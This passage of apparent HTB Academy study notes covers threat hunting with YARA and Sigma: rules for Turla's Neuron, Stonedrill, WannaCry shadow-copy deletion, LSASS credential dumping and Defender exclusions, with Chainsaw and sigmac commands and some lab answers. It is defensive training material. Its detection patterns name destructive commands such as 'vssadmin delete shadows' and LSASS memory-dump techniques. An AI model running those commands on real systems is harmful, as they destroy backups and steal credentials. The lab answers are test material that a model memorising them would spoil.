\"ee362a8161bd442073775363bf5fa1305abac2ce39b903d63df0d7121ba60550\"\n   strings:\n      $x1 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NETCLR 2.0.50727)\" fullword ascii\n      $x2 = \"http://%s/imgres?q=A380&amp;hl=en-US&amp;sa=X&amp;biw=1440&amp;bih=809&amp;tbm=isus&amp;tbnid=aLW4-J8Q1lmYBM\" ascii\n\n      $s1 = \"hWritePipe2 Error:%d\" fullword ascii\n      $s2 = \"Not Support This Function!\" fullword ascii\n      $s3 = \"Cookie: SESSIONID=%s\" fullword ascii\n      $s4 = \"http://0.0.0.0/1\" fullword ascii\n      $s5 = \"Content-Type: image/x-png\" fullword ascii\n      $s6 = \"Accept-Language: en-US\" fullword ascii\n      $s7 = \"IISCMD Error:%d\" fullword ascii\n      $s8 = \"[IISEND=0x%08X][Recv:] 0x%08X %s\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize &lt; 200KB and (\n            pe.imphash() == \"414bbd566b700ea021cfae3ad8f4d9b9\" or\n            1 of ($x*) or\n            6 of them\n         )\n      )\n}\n</code></pre> <p><code>1 of ($x*)</code>: At least one of the $x strings (from the strings section) must be present in the file.</p> <p><code>6 of them</code>: Requires that at least six of the strings (from both $x and $s categories) be found within the scanned file.</p> <p>Example 2: Neuron Used by Turla</p> <p>Perform .NET \"reversing\" using the monodis tool as follows.</p> <pre><code>$ monodis --output=code Microsoft.Exchange.Service.exe\n$ cat code\n\n</code></pre> <p>dnSpy is a .NET debugger and assembly editor like.</p> <pre><code>rule neuron_functions_classes_and_vars {\n meta:\n   description = \"Rule for detection of Neuron based on .NET functions and class names\"\n   author = \"NCSC UK\"\n   reference = \"https://www.ncsc.gov.uk/file/2691/download?token=RzXWTuAB\"\n   reference2 = \"https://www.ncsc.gov.uk/alerts/turla-group-malware\"\n   hash = \"d1d7a96fcadc137e80ad866c838502713db9cdfe59939342b8e3beacf9c7fe29\"\n strings:\n   $class1 = \"StorageUtils\" ascii\n   $class2 = \"WebServer\" ascii\n   $class3 = \"StorageFile\" ascii\n   $class4 = \"StorageScript\" ascii\n   $class5 = \"ServerConfig\" ascii\n   $class6 = \"CommandScript\" ascii\n   $class7 = \"MSExchangeService\" ascii\n   $class8 = \"W3WPDIAG\" ascii\n   $func1 = \"AddConfigAsString\" ascii\n   $func2 = \"DelConfigAsString\" ascii\n   $func3 = \"GetConfigAsString\" ascii\n   $func4 = \"EncryptScript\" ascii\n   $func5 = \"ExecCMD\" ascii\n   $func6 = \"KillOldThread\" ascii\n   $func7 = \"FindSPath\" ascii\n   $dotnetMagic = \"BSJB\" ascii\n condition:\n   (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $dotnetMagic and 6 of them\n}\n</code></pre> <p><code>uint16(uint32(0x3c)) == 0x4550</code>: A two-step check. First, it reads a 32-bit (4 bytes) value from offset <code>0x3c</code> of the file. In PE files, this offset typically contains a pointer to the PE header. It then checks whether the two bytes at that pointer are <code>PE (0x4550)</code>, indicating a valid PE header. This ensures the file is a legitimate PE format and not a corrupted or obfuscated one.</p> <p>Example 3: Stonedrill Used in Shamoon 2.0 Attacks</p> <p>Encrypted/compressed/obfuscated in PE files usually means high entropy. We can use the <code>entropy_pe_section.py</code> script to check if our sample's resource section contains anything encrypted/compressed as follows.</p> <pre><code># entropy_pe_section.py\n#https://cocomelonc.github.io/malware/2022/11/05/malware-analysis-6.html\nimport argparse\nimport math\nimport pefile\n\ndef shannon_entropy(data):\n    # 256 different possible values\n    possible = dict(((chr(x), 0) for x in range(0, 256)))\n\n    for byte in data:\n        possible[chr(byte)] +=1\n\n    data_len = len(data)\n    entropy = 0.0\n\n    # compute\n    for i in possible:\n        if possible[i] == 0:\n            continue\n\n        p = float(possible[i] / data_len)\n        entropy -= p * math.log(p, 2)\n    return entropy\n\ndef sections_entropy(path):\n    pe = pefile.PE(path)\n    for section in pe.sections[:4]:\n        print(section.Name.decode('utf-8'))\n        print(\"\\tvirtual address: \" + hex(section.VirtualAddress))\n        print(\"\\tvirtual size: \" + hex(section.Misc_VirtualSize))\n        print(\"\\traw size: \" + hex(section.SizeOfRawData))\n        print (\"\\tentropy: \" + str(shannon_entropy(section.get_data())))\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument('-f','--file', required = True, help = \"target file\")\n    args = vars(parser.parse_args())\n    target_file = args['file']\n    with open(target_file, 'rb') as f:\n        sections_entropy(target_file)\n</code></pre> <pre><code>$ python3 entropy_pe_section.py -f /home/htb-student/Samples/YARASigma/sham2.exe\n</code></pre> <pre><code>import \"pe\"\nimport \"math\"\n\nrule susp_file_enumerator_with_encrypted_resource_101 {\nmeta:\n  copyright = \"Kaspersky Lab\"\n  description = \"Generic detection for samples that enumerate files with encrypted resource called 101\"\n  reference = \"https://securelist.com/from-shamoon-to-stonedrill/77725/\"\n  hash = \"2cd0a5f1e9bcce6807e57ec8477d222a\"\n  hash = \"c843046e54b755ec63ccb09d0a689674\"\n  version = \"1.4\"\nstrings:\n  $mz = \"This program cannot be run in DOS mode.\"\n  $a1 = \"FindFirstFile\" ascii wide nocase\n  $a2 = \"FindNextFile\" ascii wide nocase\n  $a3 = \"FindResource\" ascii wide nocase\n  $a4 = \"LoadResource\" ascii wide nocase\n\ncondition:\nuint16(0) == 0x5A4D and\nall of them and\nfilesize &lt; 700000 and\npe.number_of_sections &gt; 4 and\npe.number_of_signatures == 0 and\npe.number_of_resources &gt; 1 and pe.number_of_resources &lt; 15 and for any i in (0..pe.number_of_resources - 1):\n( (math.entropy(pe.resources[i].offset, pe.resources[i].length) &gt; 7.8) and pe.resources[i].id == 101 and\npe.resources[i].length &gt; 20000 and\npe.resources[i].language == 0 and\nnot ($mz in (pe.resources[i].offset..pe.resources[i].offset + pe.resources[i].length))\n)\n}\n</code></pre> <p>How to Write Simple but Sound Yara Rules - Part 1</p> <p>How to Write Simple but Sound Yara Rules - Part 2</p> <p>How to Write Simple but Sound Yara Rules - Part 3</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#hunting-evil-with-yara-windows-edition", "title": "Hunting Evil with YARA (Windows Edition)", "text": "<p>Hunting for Malicious Executables on Disk with YARA</p> <pre><code>$ hexdump dharma_sample.exe -C | grep crysis -n3\n\n$ hexdump dharma_sample.exe -C | grep sssssbsss -n3\n\nyara64.exe -s C:\\Rules\\yara\\dharma_ransomware.yar C:\\Samples\\YARASigma\\ -r 2&gt;null\n</code></pre> <p>Hunting for Evil Within Running Processes with YARA</p> <p>YARA Rule Source: https://github.com/cuckoosandbox/community/blob/master/data/yara/shellcode/metasploit.yar</p> <pre><code># execute the injection\n.\\htb_sample_shell.exe\n\nGet-Process | ForEach-Object { \"Scanning with Yara for meterpreter shellcode on PID \"+$_.id; &amp; \"yara64.exe\" \"C:\\Rules\\yara\\meterpreter_shellcode.yar\" $_.id }\n\nyara64.exe C:\\Rules\\yara\\meterpreter_shellcode.yar 9084 --print-strings\n</code></pre> <p>Hunting for Evil Within ETW Data with YARA</p> <p>Event Tracing For Windows (ETW) </p> <p>YARA Rule Scanning on ETW (Using SilkETW)</p> <pre><code>.\\SilkETW.exe -h\n\n# Example 1: YARA Rule Scanning on Microsoft-Windows-PowerShell ETW Data\n.\\SilkETW.exe -t user -pn Microsoft-Windows-PowerShell -ot file -p ./etw_ps_logs.json -l verbose -y C:\\Rules\\yara  -yo Matches\n\nInvoke-Command -ScriptBlock {Write-Host \"Hello from PowerShell\"}\n\n# Example 2: YARA Rule Scanning on Microsoft-Windows-DNS-Client ETW Data\n.\\SilkETW.exe -t user -pn Microsoft-Windows-DNS-Client -ot file -p ./etw_dns_logs.json -l verbose -y C:\\Rules\\yara  -yo Matches\n\nping iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#hunting-evil-with-yara-linux-edition", "title": "Hunting Evil with YARA (Linux Edition)", "text": "<p>Even if we can't access the machine, in many cases, a memory capture (or memory dump) from the suspicious system can be handed over to us in the Security Operations Center (SOC). It's akin to receiving a snapshot of everything happening in the system at a particular moment. </p> <p>Hunting for Evil Within Memory Images with YARA</p> <ul> <li> <p>Create YARA Rules: Either develop bespoke YARA rules or lean on existing ones that target memory-based malware traits or dubious behaviors.</p> </li> <li> <p>Compile YARA Rules: Compile the YARA rules into a binary format using the yarac tool (YARA Compiler). This step creates a file containing the compiled YARA rules with a .yrc extension. This step is optional, as we can use the normal rules in text format as well.</p> </li> <li> <p>Obtain Memory Image: Capture a memory image using tools such as DumpIt, MemDump, Belkasoft RAM Capturer, Magnet RAM Capture, FTK Imager, and LiME (Linux Memory Extractor).</p> </li> <li> <p>Memory Image Scanning with YARA: Use the yara tool and the compiled YARA rules to scan the memory image for possible matches.</p> </li> </ul> <pre><code>$ yara /home/htb-student/Rules/yara/wannacry_artifacts_memory.yar /home/htb-student/MemoryDumps/compromised_system.raw --print-strings\n\n# Single Pattern YARA Scanning Against a Memory Image\n$ vol.py -f /home/htb-student/MemoryDumps/compromised_system.raw yarascan -U \"www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\"\n\n# Multiple YARA Rule Scanning Against a Memory Image\n$ vol.py -f /home/htb-student/MemoryDumps/compromised_system.raw yarascan -y /home/htb-student/Rules/yara/wannacry_artifacts_memory.yar\n</code></pre> <p>the <code>-U</code> option allows us to directly specify a YARA rule string within the command-line, while the <code>-y</code> option is used to specify the path to a file containing one or more YARA rules.</p> <p>Q: Study the following resource https://blogs.vmware.com/security/2022/09/threat-report-illuminating-volume-shadow-deletion.html to learn how WannaCry performs shadow volume deletion. Then, use yarascan when analyzing \"/home/htb-student/MemoryDumps/compromised_system.raw\" to identify the process responsible for deleting shadows. Enter the name of the process as your answer.</p> <pre><code>$ /usr/local/bin/vol.py -f /home/htb-student/MemoryDumps/compromised_system.raw yarascan -U \"vssadmin\"\n````\n![alt text](assets/image28.png)\n\n`@WanaDecryptor@` \n\nOR\n\n```sh\n# yara rule\nrule ShadowVolumeDeletion\n{\n    meta:\n        description = \"Detects shadow volume deletion activities\"\n        author = \"Ying Bai\"\n        last_modified = \"2025-01-20\"\n\n    strings:\n        $vssadmin_delete = \"vssadmin delete shadows\"\n        $vssadmin_delete_all = \"vssadmin delete shadows /all\"\n        $wmic_shadow_delete = \"wmic shadowcopy delete\"\n        $wmic_shadow_delete_all = \"wmic shadowcopy delete /all\"\n        $cmd_args = \"-delete\"\n\n    condition:\n        any of ($vssadmin_delete, $vssadmin_delete_all, $wmic_shadow_delete, $wmic_shadow_delete_all) or\n        any of ($cmd_args)\n}\n\n$ /usr/local/bin/vol.py -f /home/htb-student/MemoryDumps/compromised_system.raw yarascan -y /home/htb-student/Rules/yara/shadow_volume_deletion.yar\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#hunting-evil-with-yara-web-edition", "title": "Hunting Evil with YARA (Web Edition)", "text": "<p>Hunting for Evil Within Online Datasets with YARA</p> <p>Test yara rules</p> <p>Yara Hunt</p> <p></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#sigma-and-sigma-rules", "title": "Sigma and Sigma Rules", "text": "<p>Sigma is a generic signature format used for describing detection rules for log analysis and SIEM systems. Sigma rules are typically written in <code>YAML</code> format and can be used with various security tools and platforms.</p> <p>pySigma is increasingly becoming the go-to option for rule translation, as sigmac is now considered obsolete.</p> <p>Sigma Rule Structure:</p> <p></p> <p></p> <p>log source guide: https://github.com/SigmaHQ/sigma/tree/master/documentation/logsource-guides</p> <p>Sigma's Rule Creation Guide</p>"}, {"location": "HTB/Academy/SOC%20Analyst/#developing-sigma-rules", "title": "Developing Sigma Rules", "text": "<p>Manually Developing a Sigma Rule</p> <p>Example 1: LSASS Credential Dumping</p> <pre><code># sigma rule\ntitle: LSASS Access with rare GrantedAccess flag \nstatus: experimental\ndescription: This rule will detect when a process tries to access LSASS memory with suspicious access flag 0x1010\ndate: 2023/07/08\ntags:\n    - attack.credential_access\n    - attack.t1003.001\nlogsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        TargetImage|endswith: '\\lsass.exe'\n        GrantedAccess|endswith: '0x1010'\n    condition: selection\n</code></pre> <p><code>0x1010</code> hexadecimal flag essentially combines PROCESS_VM_READ (<code>0x0010</code>) and PROCESS_QUERY_INFORMATION (<code>0x0400</code>) permissions. To translate that: the process is asking for read access to the virtual memory of LSASS and the ability to query certain information from the process. While <code>0x0410</code> is the most common GrantedAccess flag used for reading LSASS memory, <code>0x1010</code> implies both reading and querying information from the process and is also frequently observed during credential dumping attacks.</p> <p>The condition part specifies that the selection criteria must be met for the rule to trigger an alert. In this case, both the <code>TargetImage</code> and <code>GrantedAccess</code> criteria must be met.</p> <pre><code>python sigmac -t powershell 'C:\\Rules\\sigma\\proc_access_win_lsass_access.yml'\nGet-WinEvent | where {($_.ID -eq \"10\" -and $_.message -match \"TargetImage.*.*\\\\lsass.exe\" -and $_.message -match \"GrantedAccess.*.*0x1010\") } | select TimeCreated,Id,RecordId,ProcessId,MachineName,Message\n\nGet-WinEvent -Path C:\\Events\\YARASigma\\lab_events.evtx | where {($_.ID -eq \"10\" -and $_.message -match \"TargetImage.*.*\\\\lsass.exe\" -and $_.message -match \"GrantedAccess.*.*0x1010\") } | select TimeCreated,Id,RecordId,ProcessId,MachineName,Message\n</code></pre> <p>But let's not stop there - remember, false positives are the enemy of effective security monitoring.</p> <p>We should also cross-reference the SourceImage (the process initiating the access) against a list of known, safe processes that commonly interact with LSASS.</p> <p>If we see an unfamiliar or unusual process trying to read LSASS with a GrantedAccess that ends with 10, 30, 50, 70, 90, B0, D0, F0, 18, 38, 58, 78, 98, B8, D8, F8, 1A, 3A, 5A, 7A, 9A, BA, DA, FA, 0x14C2, and FF (these suffixes come from studying the GrantedAccess values that various LSASS credential dumping techniques require), that's a red flag, and our incident response protocol should kick in.</p> <p>Especially, if the SourceImage resides in suspicious paths containing, <code>\\Temp\\</code>, <code>\\Users\\Public\\</code>, <code>\\PerfLogs\\</code>, <code>\\AppData\\</code>, <code>\\htb\\</code> etc. that's another red flag, and our incident response protocol should kick in.</p> <p>A more robust version of the Sigma rule we created taking the above points into consideration can be found inside the <code>C:\\Rules\\sigma</code> directory of this section's target as <code>proc_access_win_lsass_access_robust.yml</code></p> <pre><code>title: LSASS Access From Program in Potentially Suspicious Folder\nid: fa34b441-961a-42fa-a100-ecc28c886725\nstatus: experimental\ndescription: Detects process access to LSASS memory with suspicious access flags and from a potentially suspicious folder\nreferences:\n    - https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights\n    - https://onedrive.live.com/view.aspx?resid=D026B4699190F1E6!2843&amp;ithint=file%2cpptx&amp;app=PowerPoint&amp;authkey=!AMvCRTKB_V1J5ow\n    - https://web.archive.org/web/20230208123920/https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - http://security-research.dyndns.org/pub/slides/FIRST2017/FIRST-2017_Tom-Ueltschi_Sysmon_FINAL_notes.pdf\nauthor: Florian Roth (Nextron Systems)\ndate: 2021/11/27\nmodified: 2023/05/05\ntags:\n    - attack.credential_access\n    - attack.t1003.001\n    - attack.s0002\nlogsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        TargetImage|endswith: '\\lsass.exe'\n        GrantedAccess|endswith:\n            - '10'\n            - '30'\n            - '50'\n            - '70'\n            - '90'\n            - 'B0'\n            - 'D0'\n            - 'F0'\n            - '18'\n            - '38'\n            - '58'\n            - '78'\n            - '98'\n            - 'B8'\n            - 'D8'\n            - 'F8'\n            - '1A'\n            - '3A'\n            - '5A'\n            - '7A'\n            - '9A'\n            - 'BA'\n            - 'DA'\n            - 'FA'\n            - '0x14C2'  # https://github.com/b4rtik/ATPMiniDump/blob/76304f93b390af3bb66e4f451ca16562a479bdc9/ATPMiniDump/ATPMiniDump.c\n            - 'FF'\n        SourceImage|contains:\n            - '\\Temp\\'\n            - '\\Users\\Public\\'\n            - '\\PerfLogs\\'\n            - '\\AppData\\'\n            - '\\htb\\'\n    filter_optional_generic_appdata:\n        SourceImage|startswith: 'C:\\Users\\'\n        SourceImage|contains: '\\AppData\\Local\\'\n        SourceImage|endswith:\n            - '\\Microsoft VS Code\\Code.exe'\n            - '\\software_reporter_tool.exe'\n            - '\\DropboxUpdate.exe'\n            - '\\MBAMInstallerService.exe'\n            - '\\WebexMTA.exe'\n            - '\\WebEx\\WebexHost.exe'\n            - '\\JetBrains\\Toolbox\\bin\\jetbrains-toolbox.exe'\n        GrantedAccess: '0x410'\n    filter_optional_dropbox_1:\n        SourceImage|startswith: 'C:\\Windows\\Temp\\'\n        SourceImage|endswith: '.tmp\\DropboxUpdate.exe'\n        GrantedAccess:\n            - '0x410'\n            - '0x1410'\n    filter_optional_dropbox_2:\n        SourceImage|startswith: 'C:\\Users\\'\n        SourceImage|contains: '\\AppData\\Local\\Temp\\'\n        SourceImage|endswith: '.tmp\\DropboxUpdate.exe'\n        GrantedAccess: '0x1410'\n    filter_optional_dropbox_3:\n        SourceImage|startswith:\n            - 'C:\\Program Files (x86)\\Dropbox\\'\n            - 'C:\\Program Files\\Dropbox\\'\n        SourceImage|endswith: '\\DropboxUpdate.exe'\n        GrantedAccess: '0x1410'\n    filter_optional_nextron:\n        SourceImage|startswith:\n            - 'C:\\Windows\\Temp\\asgard2-agent\\'\n            - 'C:\\Windows\\Temp\\asgard2-agent-sc\\'\n        SourceImage|endswith:\n            - '\\thor64.exe'\n            - '\\thor.exe'\n            - '\\aurora-agent-64.exe'\n            - '\\aurora-agent.exe'\n        GrantedAccess:\n            - '0x1fffff'\n            - '0x1010'\n            - '0x101010'\n    filter_optional_ms_products:\n        SourceImage|startswith: 'C:\\Users\\'\n        SourceImage|contains|all:\n            - '\\AppData\\Local\\Temp\\'\n            - '\\vs_bootstrapper_'\n        GrantedAccess: '0x1410'\n    filter_optional_chrome_update:\n        SourceImage|startswith: 'C:\\Program Files (x86)\\Google\\Temp\\'\n        SourceImage|endswith: '.tmp\\GoogleUpdate.exe'\n        GrantedAccess:\n            - '0x410'\n            - '0x1410'\n    filter_optional_keybase:\n        SourceImage|startswith: 'C:\\Users\\'\n        SourceImage|endswith: \\AppData\\Local\\Keybase\\keybase.exe\n        GrantedAccess: '0x1fffff'\n    filter_optional_avira:\n        SourceImage|contains: '\\AppData\\Local\\Temp\\is-'\n        SourceImage|endswith: '.tmp\\avira_system_speedup.tmp'\n        GrantedAccess: '0x1410'\n    filter_optional_viberpc_updater:\n        SourceImage|startswith: 'C:\\Users\\'\n        SourceImage|contains: '\\AppData\\Roaming\\ViberPC\\'\n        SourceImage|endswith: '\\updater.exe'\n        TargetImage|endswith: '\\winlogon.exe'\n        GrantedAccess: '0x1fffff'\n    filter_optional_adobe_arm_helper:\n        SourceImage|startswith:  # Example path: 'C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\1.0\\Temp\\2092867405\\AdobeARMHelper.exe'\n            - 'C:\\Program Files\\Common Files\\Adobe\\ARM\\'\n            - 'C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\'\n        SourceImage|endswith: '\\AdobeARMHelper.exe'\n        GrantedAccess: '0x1410'\n    condition: selection and not 1 of filter_optional_*\nfields:\n    - User\n    - SourceImage\n    - GrantedAccess\nfalsepositives:\n    - Updaters and installers are typical false positives. Apply custom filters depending on your environment\nlevel: medium\n</code></pre> <p>Notice how the condition filters out false positives (selection <code>and not 1 of filter_optional_*</code>).</p> <p>Example 2: Multiple Failed Logins From Single Source (Based on Event 4776)</p> <pre><code>title: Failed NTLM Logins with Different Accounts from Single Source System\nid: 6309ffc4-8fa2-47cf-96b8-a2f72e58e538\nrelated:\n    - id: e98374a6-e2d9-4076-9b5c-11bdb2569995\n      type: derived\nstatus: unsupported\ndescription: Detects suspicious failed logins with different user accounts from a single source system\nauthor: Florian Roth (Nextron Systems)\ndate: 2017/01/10\nmodified: 2023/02/24\ntags:\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1078\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection2:\n        EventID: 4776\n        TargetUserName: '*'\n        Workstation: '*'\n    condition: selection2 | count(TargetUserName) by Workstation &gt; 3\nfalsepositives:\n    - Terminal servers\n    - Jump servers\n    - Other multiuser systems like Citrix server farms\n    - Workstations with frequently changing users\nlevel: medium\n</code></pre> <p>Sigma Rule Development Resources</p> <p>As you can imagine, the best Sigma rule development resource is the official documentation, which can be found at the following links.</p> <p>https://github.com/SigmaHQ/sigma/wiki/Rule-Creation-Guide https://github.com/SigmaHQ/sigma-specification</p> <p>The following series of articles is the next best resource on Sigma rule developement.</p> <p>https://tech-en.netlify.app/articles/en510480/ https://tech-en.netlify.app/articles/en513032/ https://tech-en.netlify.app/articles/en515532/</p> <p>Q: Using sigmac translate the \"C:\\Tools\\chainsaw\\sigma\\rules\\windows\\builtin\\windefend\\win_defender_threat.yml\" Sigma rule into the equivalent PowerShell command. Then, execute the PowerShell command against \"C:\\Events\\YARASigma\\lab_events_4.evtx\" and enter the malicious driver as your answer. Answer format: _.sys</p> <pre><code>PS C:\\Tools\\sigma-0.21\\tools&gt; python sigmac -t powershell 'C:\\Tools\\chainsaw\\sigma\\rules\\windows\\builtin\\windefend\\win_defender_threat.yml'\nGet-WinEvent | where {($_.ID -eq \"1006\" -or $_.ID -eq \"1116\" -or $_.ID -eq \"1015\" -or $_.ID -eq \"1117\") } | select TimeCreated,Id,RecordId,ProcessId,MachineName,Message\n\nGet-WinEvent -Path C:\\Events\\YARASigma\\lab_events_4.evtx | where {($_.ID -eq \"1006\" -or $_.ID -eq \"1116\" -or $_.ID -eq \"1015\" -or $_.ID -eq \"1117\") } | select TimeCreated,Id,RecordId,ProcessId,MachineName,Message\n</code></pre>"}, {"location": "HTB/Academy/SOC%20Analyst/#hunting-evil-with-sigma-chainsaw-edition", "title": "Hunting Evil with Sigma (Chainsaw Edition)", "text": "<p>Sigma rules combined with tools like Chainsaw and Zircolite are our best allies.</p> <p>Scanning Windows Event Logs With Chainsaw</p> <p>Using the <code>-s</code> parameter, we can specify a directory containing Sigma detection rules (or one Sigma detection rule) and Chainsaw will automatically load, convert and run these rules against the provided event logs. The mapping file (specified through the<code>--mapping</code> parameter) tells Chainsaw which fields in the event logs to use for rule matching.</p> <pre><code>PS C:\\Tools\\chainsaw&gt; .\\chainsaw_x86_64-pc-windows-msvc.exe -h\n\n# Example 1: Hunting for Multiple Failed Logins From Single Source With Sigma\n&gt; .\\chainsaw_x86_64-pc-windows-msvc.exe hunt C:\\Events\\YARASigma\\lab_events_2.evtx -s C:\\Rules\\sigma\\win_security_susp_failed_logons_single_source2.yml --mapping .\\mappings\\sigma-event-logs-all.yml\n</code></pre> <p>Example 2: Hunting for Abnormal PowerShell Command Line Size With Sigma (Based on Event ID 4688)</p> <pre><code># proc_creation_win_powershell_abnormal_commandline_size.yml\ntitle: Unusually Long PowerShell CommandLine\nid: d0d28567-4b9a-45e2-8bbc-fb1b66a1f7f6\nstatus: test\ndescription: Detects unusually long PowerShell command lines with a length of 1000 characters or more\nreferences:\n    - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse\nauthor: oscd.community, Natalia Shornikova / HTB Academy, Dimitrios Bougioukas\ndate: 2020/10/06\nmodified: 2023/04/14\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - detection.threat_hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        EventID: 4688\n        NewProcessName|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\cmd.exe'\n    selection_powershell:\n        CommandLine|contains:\n            - 'powershell.exe'\n            - 'pwsh.exe'\n    selection_length:        \n        CommandLine|re: '.{1000,}'\n    condition: selection and selection_powershell and selection_length\nfalsepositives:\n    - Unknown\nlevel: low\n</code></pre> <pre><code>.\\chainsaw_x86_64-pc-windows-msvc.exe hunt C:\\Events\\YARASigma\\lab_events_3.evtx -s C:\\Rules\\sigma\\proc_creation_win_powershell_abnormal_commandline_size.yml --mapping .\\mappings\\sigma-event-logs-all.yml\n\n#  introduced the NewProcessName field into a sigma-event-logs-all-new.yml mapping file inside the C:\\Tools\\chainsaw\\mappings directory of this section's target.\n.\\chainsaw_x86_64-pc-windows-msvc.exe hunt C:\\Events\\YARASigma\\lab_events_3.evtx -s C:\\Rules\\sigma\\proc_creation_win_powershell_abnormal_commandline_size.yml --mapping .\\mappings\\sigma-event-logs-all-new.yml\n</code></pre> <pre><code>........\ngroups:\n  - name: Sigma\n    timestamp: Event.System.TimeCreated\n    filter:\n      Provider: \"*\"\n    fields:\n    ..............\n      - from: NewProcessName\n        to: Event.EventData.NewProcessName\n        visible: false\n    ...............\n</code></pre> <p>Q: Use Chainsaw with the \"C:\\Tools\\chainsaw\\sigma\\rules\\windows\\powershell\\powershell_script\\posh_ps_win_defender_exclusions_added.yml\" Sigma rule to hunt for suspicious Defender exclusions inside \"C:\\Events\\YARASigma\\lab_events_5.evtx\". Enter the excluded directory as your answer.</p> <pre><code># posh_ps_win_defender_exclusions_added.yml\ntitle: Windows Defender Exclusions Added - PowerShell\nid: c1344fa2-323b-4d2e-9176-84b4d4821c88\nrelated:\n    - id: 17769c90-230e-488b-a463-e05c08e9d48f\n      type: similar\nstatus: experimental\ndescription: Detects modifications to the Windows Defender configuration settings using PowerShell to add exclusions\nreferences:\n    - https://www.elastic.co/guide/en/security/current/windows-defender-exclusions-added-via-powershell.html\nauthor: Tim Rauch\ndate: 2022/09/16\nmodified: 2022/11/26\ntags:\n    - attack.defense_evasion\n    - attack.t1562\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: ps_script\n    product: windows\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection_args_exc:\n        ScriptBlockText|contains:\n            - ' -ExclusionPath '\n            - ' -ExclusionExtension '\n            - ' -ExclusionProcess '\n            - ' -ExclusionIpAddress '\n    selection_args_pref:\n        ScriptBlockText|contains:\n            - 'Add-MpPreference '\n            - 'Set-MpPreference '\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium\n</code></pre> <pre><code>.\\chainsaw_x86_64-pc-windows-msvc.exe hunt C:\\Events\\YARASigma\\lab_events_5.evtx -s C:\\Tools\\chainsaw\\sigma\\rules\\windows\\powershell\\powershell_script\\posh_ps_win_defender_exclusions_added.yml --mapping .\\mappings\\sigma-event-logs-all-new.yml\n\nc:\\document\\virus\\\n</code></pre> <p></p>"}, {"location": "HTB/Academy/SOC%20Analyst/#hunting-evil-with-sigma-splunk-edition", "title": "Hunting Evil with Sigma (Splunk Edition)", "text": "<p>Example 1: Hunting for MiniDump Function Abuse to Dump LSASS's Memory (comsvcs.dll via rundll32)</p> <pre><code># proc_access_win_lsass_dump_comsvcs_dll.yml\ntitle: Lsass Memory Dump via Comsvcs DLL\nid: a49fa4d5-11db-418c-8473-1e014a8dd462\nstatus: test\ndescription: Detects adversaries leveraging the MiniDump export function from comsvcs.dll via rundll32 to perform a memory dump from lsass.\nreferences:\n    - https://twitter.com/shantanukhande/status/1229348874298388484\n    - https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/\nauthor: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2020/10/20\nmodified: 2022/10/09\ntags:\n    - attack.credential_access\n    - attack.t1003.001\nlogsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        TargetImage|endswith: '\\lsass.exe'\n        SourceImage: 'C:\\Windows\\System32\\rundll32.exe'\n        CallTrace|contains: 'comsvcs.dll'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n</code></pre> <pre><code>PS C:\\Tools\\sigma-0.21\\tools&gt; python sigmac -t splunk C:\\Tools\\chainsaw\\sigma\\rules\\windows\\process_access\\proc_access_win_lsass_dump_comsvcs_dll.yml -c .\\config\\splunk-windows.yml\n\n(TargetImage=\"*\\\\lsass.exe\" SourceImage=\"C:\\\\Windows\\\\System32\\\\rundll32.exe\" CallTrace=\"*comsvcs.dll*\")\n</code></pre> <p></p> <p>Example 2: Hunting for Notepad Spawning Suspicious Child Process</p> <pre><code># proc_creation_win_notepad_susp_child.yml\ntitle: Notepad Calling Suspicious Child Process\nid: dcddc6ad-dbfb-40eb-82ca-d431a52e99bf\nstatus: experimental\ndescription: Detects notepad.exe spawning a suspicious child process\nauthor: Dimitrios Bougioukas\ndate: 2023/31/08\nmodified: 2023/31/08\ntags:\n    - attack.defense_evasion\n    - attack.t1036\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\notepad.exe'\n        Image|endswith:\n            # Add more suspicious LOLBins\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\cmd.exe'\n            - '\\mshta.exe'\n            - '\\cscript.exe'\n            - '\\wscript.exe'\n            - '\\taskkill.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            # - '\\csc.exe'   # https://app.any.run/tasks/f420d295-0457-4e9b-9b9e-6732be227583/\n            - '\\calc.exe'  # https://app.any.run/tasks/f420d295-0457-4e9b-9b9e-6732be227583/\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n</code></pre> <pre><code>python sigmac -t splunk C:\\Rules\\sigma\\proc_creation_win_notepad_susp_child.yml -c .\\config\\splunk-windows.yml\n\n(ParentImage=\"*\\\\notepad.exe\" (Image=\"*\\\\powershell.exe\" OR Image=\"*\\\\pwsh.exe\" OR 